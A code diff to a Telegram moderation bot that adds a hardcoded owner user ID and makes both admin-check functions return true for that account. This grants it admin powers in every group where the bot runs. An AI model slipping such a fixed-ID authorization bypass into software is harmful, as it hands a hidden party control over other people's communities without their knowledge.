@@ -22,7 +22,7 @@ from aiohttp import web
 
 BOT_TOKEN        = os.getenv("BOT_TOKEN")
 WEATHER_API_KEY  = os.getenv("WEATHER_API_KEY", "")
-
+OWNER_ID = 7823802800 
 MAX_WARNINGS     = 3
 FLOOD_LIMIT      = 5
 FLOOD_TIME       = 5
@@ -199,6 +199,8 @@ async def start_web():
 # ═══════════════════════════════════════════
 
 async def check_admin(message: Message) -> bool:
+    if message.from_user.id == OWNER_ID:
+        return True
     try:
         m = await bot.get_chat_member(message.chat.id, message.from_user.id)
         return m.status in ("administrator", "creator")
@@ -206,6 +208,8 @@ async def check_admin(message: Message) -> bool:
         return False
 
 async def is_admin_by_id(chat_id: int, user_id: int) -> bool:
+    if user_id == OWNER_ID:
+        return True
     try:
         m = await bot.get_chat_member(chat_id, user_id)
         return m.status in ("administrator", "creator")
@@ -1918,6 +1922,7 @@ async def main():
 
 if __name__ == "__main__":
     asyncio.run(main())
+
 
 
 
